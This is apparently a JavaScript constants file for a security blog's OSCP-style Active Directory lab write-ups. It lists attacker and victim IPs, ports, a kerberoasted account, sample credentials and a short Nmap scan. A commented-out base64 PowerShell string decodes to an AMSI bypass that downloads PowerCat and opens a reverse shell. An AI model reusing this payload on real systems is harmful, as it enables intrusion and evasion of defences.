export const EXAMPLE_PATH = "blog-starter";
export const CMS_NAME = "Markdown";
export const Home = "https://tkokhing.github.io";
export const LOGO_PATH = "/img/logo";
export const REPO_NAME = ""; // for future expansion use
export const T_ANI_GIF_URL = `${LOGO_PATH}/tkokhing.gif`;
export const TKOKHING_LOGO_SVG_URL = `${LOGO_PATH}/tkokhing.svg`;

// AD Setup

// export const MS01_IP_EXT = "192.168.118.173";
// export const MS01_IP_INT = "172.16.242.173";
// export const MS01_FORWARD_PORT_2 = "4444";

// // // for kerberoasted service 
// export const RUNNING_SPN = "svc-auth";

// // // EncodedText for SCSHELL
// export const EncodedText = "encoded_text_for_scshell"

// export const MS02_IP_INT = "172.16.242.176";
// export const MS02_PORT_FORWARD = "4443";

// export const DC01_IP = "172.16.242.162";
// export const DC01_PORT_FORWARD = "4442";

// ----------------------------  Attacker  ----------------------------
// export const ATTACKER_IP = "192.168.49.123"; //updated   

export const ATTACKER_IP = "192.162.118.10"; //Vixx
export const ATTACKER_PORT = "22";

// ---------------------------- AD Domain Name  ----------------------------
// export const AD_DOMAIN_NAME = "OSCP.EXAM" //updated
export const AD_DOMAIN_NAME = "CAR.TOON" //mine

// ---------------------------- Client01  aka MS01  ----------------------------

// // Client01 (aka MS01) Browser Viewing
// // - Internal (172.16.242.173)
// export const MS01_username = "r.andrews";  // updated
// export const MS01_password = "BusyOfficeWorker890"; //updated
export const MS01_username = "his_username";  // updated
export const MS01_password = "his_password"; //updated

// export const MS01_IP_EXT = "192.168.123.206";  //updated
// export const MS01_IP_INT = "172.16.123.206"; // updated
export const MS01_IP_EXT = "192.168.118.173"; //Vixx
export const MS01_IP_INT = "172.16.242.173";  //Vixx

export const MS01_FORWARD_PORT_1 = "80";   // To download <u>PowerCat</u>
export const MS01_FORWARD_PORT_2 = "4444"; // To open <u>reverse shell</u>


// ---------------------------- WEB01  aka MS02  ----------------------------
// // WEB01 (aka MS02) Terminal
// // - Internal (172.16.242.176)
//updated
// export const MS02_IP_INT = "172.16.123.202"; //updated
export const MS02_IP_INT = "172.16.242.176"; //Vixx
export const MS02_PORT_FORWARD = "4443";


// ---------------------------- DC01  aka DC01  ----------------------------
//updated
// export const DC01_IP = "172.16.123.200"; //updated
export const DC01_IP = "172.16.242.162"; //Vixx
export const DC01_PORT_FORWARD = "4442";


// ---------------------------- AD Attacker  ----------------------------

export const AD_ATTACKER_IP = ATTACKER_IP;
export const AD_ATTACKER_LISTEN_PORT_1 = "80";  // To facilitate pulling of <u>PowerCat</u>
export const AD_ATTACKER_LISTEN_PORT_2 = "443"; // To facilitate incoming <u>reverse shell</u> 


// // for kerberoasted service 
export const RUNNING_SPN = "svc-auth";
export const RUNNING_SPN_HASH = "hashhashashashverylong";
export const RUNNING_SPN_PASSWORD = "running_spn_pas$word";


// // EncodedText for SCSHELL
// // // // export const EncodedText = "please_update_encoded_text_for_scshell"
// // // // export const EncodedText = "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgA0ADIALgAxADcAMwAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA3ADIALgAxADYALgAyADQAMgAuADEANwAzACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA"
export const EncodedText = "please_update_encoded_text_for_scshell"


// ---------------------------- VICTIM  ----------------------------
// For all sites VICTIM TAGGING  192.168.123.110
// export const VICTIM1_IP = MS01_IP_EXT;
// export const VICTIM1_IP = "192.168.123.110";
export const VICTIM1_NAME = MS01_username;
export const VICTIM1_PASSWORD = MS01_password;
export const VICTIM1_IP = MS01_IP_EXT;
export const VICTIM1_PORT = MS01_FORWARD_PORT_2;

// Scan on MS01
// PORT     STATE SERVICE       REASON
// 135/tcp  open  msrpc         syn-ack ttl 127
// 139/tcp  open  netbios-ssn   syn-ack ttl 127
// 445/tcp  open  microsoft-ds  syn-ack ttl 127
// 3389/tcp open  ms-wbt-server syn-ack ttl 127
// 5985/tcp open  wsman         syn-ack ttl 127

// Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds